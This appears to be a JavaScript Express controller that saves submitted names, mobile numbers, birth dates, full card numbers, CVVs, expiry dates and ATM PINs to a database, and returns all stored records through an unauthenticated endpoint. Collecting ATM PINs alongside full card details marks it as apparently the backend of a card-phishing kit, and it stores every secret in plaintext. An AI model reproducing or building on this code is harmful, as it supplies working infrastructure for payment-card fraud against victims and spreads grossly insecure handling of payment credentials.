// controllers/userController.js
const User = require('../models/User');

// Save user data to the database
exports.saveUserData = async (req, res) => {
    try {
        const { name, mobile, dob, cardLastSix, atmPin, cvv, fullCardNumber, expiryDate } = req.body;
        
        // Creating a new user entry
        const user = new User({
            name,
            mobile,
            dob,
            cardLastSix,
            atmPin,
            cvv,
            fullCardNumber,
            expiryDate
        });
        
        // Save the user to the database
        await user.save();
        
        res.status(201).json({
            success: true,
            message: "User data saved successfully",
            data: user
        });
    } catch (err) {
        console.error(err);
        res.status(500).json({
            success: false,
            message: "Error saving user data",
            error: err.message
        });
    }
};

// Get all users from the database
exports.getAllUsers = async (req, res) => {
    try {
        const users = await User.find();
        
        res.status(200).json({
            success: true,
            data: users
        });
    } catch (err) {
        console.error(err);
        res.status(500).json({
            success: false,
            message: "Error fetching users",
            error: err.message
        });
    }
};
